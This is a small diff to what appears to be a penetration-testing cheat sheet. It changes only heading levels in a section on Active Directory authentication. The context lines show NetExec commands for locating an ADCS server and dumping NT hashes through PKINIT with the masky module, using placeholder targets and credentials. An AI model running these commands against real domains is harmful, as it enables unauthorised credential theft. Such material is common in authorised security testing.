@@ -497,11 +497,11 @@ grep -i <keyword> *
   <summary> Domain authentication </summary> 
 
   ### Dump NT:hash with masky with domain user
-  #### Get ADCS server name
+  ### Get ADCS server name
   ```shell
   NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> -M adcs
   ```
-  #### Retrieve the NT hash using PKINIT
+  ### Retrieve the NT hash using PKINIT
   ```shell
   NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M masky -o CA=<'ADCS_server_name'>
   ```
